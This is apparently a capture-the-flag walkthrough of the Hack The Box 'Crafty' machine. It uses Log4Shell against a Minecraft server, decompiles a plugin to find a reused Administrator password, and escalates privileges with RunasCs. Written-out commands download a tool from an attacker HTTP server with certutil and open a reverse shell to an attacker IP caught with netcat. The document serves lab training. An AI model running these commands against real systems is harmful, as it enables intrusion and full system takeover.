Phase 0

Reconnaissance

Nmap

$ sudo nmap -sCV -p- -T4 10.129.230.193
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows
$ echo "10.129.230.193 crafty.htb" | sudo tee -a /etc/hosts

Port 80 is IIS (just a landing page). Port 25565 is a Minecraft Java Edition 1.16.5 server — which uses Log4j for logging.

Why Minecraft + Log4j = RCE Minecraft Java Edition uses Apache Log4j for all logging, including player chat messages. Version 1.16.5 ships with a vulnerable Log4j version. When a player sends ${jndi:ldap://attacker/...} in chat, Log4j parses it as a JNDI lookup, connects to the attacker's LDAP server, downloads and executes arbitrary Java code. This is CVE-2021-44228 (Log4Shell) — one of the most impactful vulnerabilities in history.

Phase 2

Enumeration — Decompiling the Custom Plugin

Finding the Plugin

PS> dir /s /b *.jar
C:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
Why this JAR is suspicious SNAPSHOT in the name = development/testing build, often with hardcoded credentials. It's the only custom plugin (9KB, tiny). Java .jar files are just ZIP archives containing .class bytecode — which is trivially decompilable back to readable source code.

Exfiltrate the JAR

# On target: encode as base64 (certutil)
PS> copy C:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar c:\temp\p.jar
PS> certutil -encode c:\temp\p.jar c:\temp\b64.txt
PS> type c:\temp\b64.txt
certutil base64 gotcha certutil -encode wraps the output in -----BEGIN CERTIFICATE----- / -----END CERTIFICATE----- headers. Linux's base64 -d chokes on these lines. Strip them before decoding: 
# On attacker: remove header/footer lines, then decode
$ sed '1d;$d' b64.txt | base64 -d > playercounter-1.0-SNAPSHOT.jar

Decompile → Hardcoded RCON Password

# Use jadx, JD-GUI, or javadecompilers.com
$ jadx playercounter-1.0-SNAPSHOT.jar
package htb.crafty.playercounter;

public final class Playercounter extends JavaPlugin {
   public void onEnable() {
      Rcon rcon = null;
      try {
         rcon = new Rcon("127.0.0.1", 27015,
            "s67u84zKq8IXw".getBytes());  // ← hardcoded RCON password
      } catch (IOException e) { ... }
   }
}
Phase 3

Privilege Escalation — RunasCs as Administrator

The RCON password is reused as the Administrator password. Use RunasCs to run commands as Administrator on Windows:

Upload RunasCs

# Attacker: download and serve RunasCs
$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
$ unzip RunasCs.zip
$ python3 -m http.server 8081

# Target: download RunasCs
PS> certutil -urlcache -f http://10.10.15.65:8081/RunasCs.exe RunasCs.exe
What is RunasCs? Windows' built-in runas command requires an interactive desktop — it can't be used from a reverse shell. RunasCs is an open-source alternative that works from non-interactive sessions. It spawns a process as a specified user, optionally connecting its I/O to a reverse shell (-r flag). Think of it as Windows' equivalent of su for shells.

Verify Credentials + Get Admin Shell

# Verify the password works
PS> .\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"
crafty\administrator

# Reverse shell as Administrator
PS> .\RunasCs.exe Administrator s67u84zKq8IXw cmd.exe -r 10.10.15.65:5555

# Attacker: catch admin shell
$ nc -lnvp 5555
C:\Windows\system32> whoami
crafty\administrator

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
30c852d39aed7ba210399f090e9f814f
Appendix

Key Takeaways

Minecraft servers are Log4Shell targets.

Any Minecraft Java Edition server running pre-patched versions uses vulnerable Log4j. Player chat messages are logged → JNDI lookup → RCE. No authentication needed — just join and type.

RogueJNDI automates the entire Log4Shell chain.

It hosts both the LDAP redirector and the HTTP class server. One command + one chat message = shell.

Java JARs are trivially decompilable.

.jar = ZIP of .class bytecode. Tools like jadx/JD-GUI recover near-original source. Developers who hardcode secrets in Java have no hiding place.

certutil -encode adds headers that break Linux base64.

Strip the -----BEGIN/END CERTIFICATE----- lines before decoding. Use sed '1d;$d' for a quick fix.

RunasCs is essential for Windows privilege escalation.

Windows' native runas doesn't work from non-interactive shells. RunasCs fills that gap with reverse shell support (-r flag). Keep it in your toolbox alongside PowerShell credential objects.
